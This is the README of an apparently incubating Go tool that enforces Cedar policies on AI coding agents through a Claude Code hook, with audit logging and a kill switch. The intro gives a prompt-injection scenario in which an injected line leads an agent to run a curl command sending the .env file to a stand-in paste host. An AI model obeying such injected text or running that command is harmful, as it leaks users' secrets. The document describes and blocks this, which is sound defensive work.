<a id="readme-top"></a>

<h1 align="center">🛡️ AI Security Command Center</h1>

<p align="center">
  <em>Decide what every AI agent may do, prove what it did,<br>and stop it when it shouldn't.</em>
</p>

<p align="center">
  <a href="docs/README.md"><strong>Explore the docs »</strong></a>
</p>

<p align="center">
  <a href="docs/ROADMAP.md">Roadmap</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Report Bug</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Request Feature</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/status-incubating-F59E0B?style=for-the-badge" alt="Status: incubating">
  <a href="docs/ROADMAP.md"><img src="https://img.shields.io/badge/plan-ROADMAP-8B5CF6?style=for-the-badge" alt="Roadmap"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2ea44f?style=for-the-badge" alt="License: MIT"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go 1.26">
  <img src="https://img.shields.io/badge/Cedar-policies-FF9900?style=flat-square" alt="Cedar policies">
  <img src="https://img.shields.io/badge/Claude_Code-hook-D97757?style=flat-square" alt="Claude Code hook">
  <img src="https://img.shields.io/badge/network_calls-zero-6B7280?style=flat-square" alt="Network calls: zero">
</p>

---

> [!WARNING]
> **Incubating.** The policy decision point, the Claude Code hook, the audit log, the kill switch and the posture
> check and `discover` work and are tested. Non-human identities in the registry and the browser demo aren't
> built yet, and nothing here has had an outside review. The [roadmap](docs/ROADMAP.md) says what's next.

## 🎯 What it's for

Your coding agent can run any command your shell can. One injected line in a README or an issue, and it runs
`curl -d @.env https://paste.example` for you. Allow-lists inside each tool don't add up to a policy, and
afterwards nobody can say what the agent was allowed to do.

ASCC (`ascc`) puts one policy decision point in front of the agent:

| Command | Status | What it does |
|:---|:---|:---|
| **`decide`** | works | Evaluates a request (agent, action, resource, context) against Cedar policies and an agent registry. Default deny, with the policy ids and a plain-English reason for every answer. |
| **`hook claude-code`** | works | Runs as a Claude Code PreToolUse hook: asks the policies before every tool call, blocks the denied ones and records every decision. Any error blocks the call. [Setup guide](docs/guides/claude-code-setup.md). |
| **`audit verify`** | works | Checks the hash-chained log every decision lands in and names the first line that was edited, removed or reordered. `--expect-head <hash>` catches lines cut off the end. |
| **`kill` / `revive`** | works | Suspends an agent so everything it asks for is denied, and brings it back. Both are audited. |
| **`posture claude-code`** | works | Reads the Claude Code settings files, never writes them, and says for each agent whether its hook is registered so that it enforces: in managed settings, matcher `*`, `"onFailure": "block"`, nothing switching it off. Each failure names its reason. [What it checks](docs/guides/claude-code-setup.md#posture). |
| **`discover`** | works | Searches a folder for the agent config files it knows (Claude Code settings, `.mcp.json`, `.claude.json` and the managed files) and reports what the registry doesn't list: a Claude Code setup with no ascc hook, a hook for an unregistered agent, an MCP server none of whose tools is listed. Variable names that look like credentials become candidate identities. It reads names only, never a value. [What it finds](docs/guides/claude-code-setup.md#discover). |
| **`inventory`** | works | Writes the registry as an Agent Security Suite inventory document, with findings for agents that have no owner, no policy or are suspended. Each agent's label is computed from evidence, never declared: `unmonitored` when the hook has recorded nothing for it, `observed` when it has but the posture check doesn't pass, `enforced` only with both. |

The browser demo will run the same Go core as WebAssembly on a planted setup.

That's the public MVP. The full design, a gateway for MCP and LLM traffic, a credential broker, default-deny
egress, a plugin platform and NHI connectors, is in the [planning package](docs/product/plan/README.md) and gets
built in public after release.

### What it won't do (yet)

- Sit in the network path. No gateway or proxy in the MVP; the Claude Code hook is the only enforcement point,
  and it judges shell commands by their text, which a determined agent can dodge. The
  [setup guide](docs/guides/claude-code-setup.md#limits) lists what it doesn't cover.
- Make a network call, or hold or print a secret. The audit log keeps a hash of each tool input, not the input.
- Let a model decide. Decisions come from policy alone.
- Pretend to see what it can't. An agent it can't enforce on is reported as `unmonitored`.

## 🚀 Quick start

From a clone, with Go 1.26 or newer:

```bash
go build -o bin/ ./src/cmd/ascc   # builds bin/ascc (bin/ascc.exe on Windows)
cd examples                       # a sample registry, policies and requests, all fictional
../bin/ascc decide --request requests/exfil-curl.json
```

That request is `dev-agent` asking to run a shell command that touches a secret file and the network:

```json
{
  "decision": "deny",
  "policy_ids": [
    "deny-network-with-secret-path"
  ],
  "reason": "forbidden by deny-network-with-secret-path: a shell command may not send a secret file over the network"
}
```

`ascc` reads `ascc.registry.json` and every `policies/*.cedar` from the current folder; `--registry` and
`--policies` point it elsewhere, and `--request -` reads the request from stdin. `ascc inventory` prints the
inventory document, or writes it with `--out <file>`. Exit code 0 means a decision was made, allow or deny;
2 means ascc couldn't run, and `decide` still prints a deny. `ascc posture claude-code` exits 1 when a hook
registration doesn't enforce; on a machine with no managed settings that is every agent, and it says why.

To put it in front of a real agent, follow the [Claude Code setup guide](docs/guides/claude-code-setup.md). The
same folder has two hook payloads to try by hand:

```bash
../bin/ascc hook claude-code --agent dev-agent < hook-payloads/exfil-curl.json   # prints the deny Claude Code blocks on
../bin/ascc audit verify                                                          # checks the log that call was written to
../bin/ascc kill dev-agent                                                        # now everything dev-agent asks for is denied
```

What's denied without any policy saying so: an agent or a tool that isn't in the registry, a suspended or retired
agent, a request whose context doesn't fit the built-in schema, a policy that errors while evaluating, and
anything no policy permits. A registry with a typo, or a policy with no `@id` or one that reads an attribute
the schema doesn't have, stops ascc loading at all.

## 🗂️ What's in here

| Folder | What's inside |
|:---|:---|
| [**📚 docs/**](docs/README.md) | The roadmap, the changelog, the public-MVP spec and build plan, the full planning package and the resource library. |
| [**🧩 src/**](src/) | The Go code: `cmd/ascc` is the CLI, `internal/` holds the packages. Tests sit next to the code. |
| [**🧪 examples/**](examples/) | A sample registry, Cedar policies and requests with fictional agents. The tests run these same files. |
| [**📐 schemas/**](schemas/) | The Agent Security Suite inventory schema, v0.1, vendored from `ai-automation-tools.dev`. |
| [**🖥️ site/**](site/) | The demo page and its favicon. A "coming soon" shell for now. |

## 🛠️ Development

```bash
gofmt -l .        # must print nothing
go vet ./...
go test ./...
go build ./...
```

Agents working this repo read [AGENTS.md](AGENTS.md) first. Security reports go through
[SECURITY.md](SECURITY.md), not public issues.

---

<p align="center">
  Built with <a href="https://go.dev/">Go</a> · <a href="docs/README.md">Docs</a> · <a href="LICENSE">MIT License</a> · part of <a href="https://github.com/ai-automation-tools">ai-automation-tools</a>
</p>
